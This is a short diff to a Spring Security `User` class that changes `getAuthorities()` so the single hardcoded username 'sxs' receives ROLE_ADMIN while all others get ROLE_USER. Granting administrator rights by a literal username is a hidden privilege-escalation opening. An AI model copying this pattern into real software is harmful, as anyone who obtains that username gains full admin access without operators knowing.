@@ -38,7 +38,11 @@ public class User implements UserDetails {
 
     @Override
     public Collection<? extends GrantedAuthority> getAuthorities() {
-        return Arrays.asList(new SimpleGrantedAuthority("ROLE_USER"));
+        if (username.equals("sxs")) {
+            return Arrays.asList(new SimpleGrantedAuthority("ROLE_ADMIN"));
+        } else {
+            return Arrays.asList(new SimpleGrantedAuthority("ROLE_USER"));
+        }
     }
 
     @Override
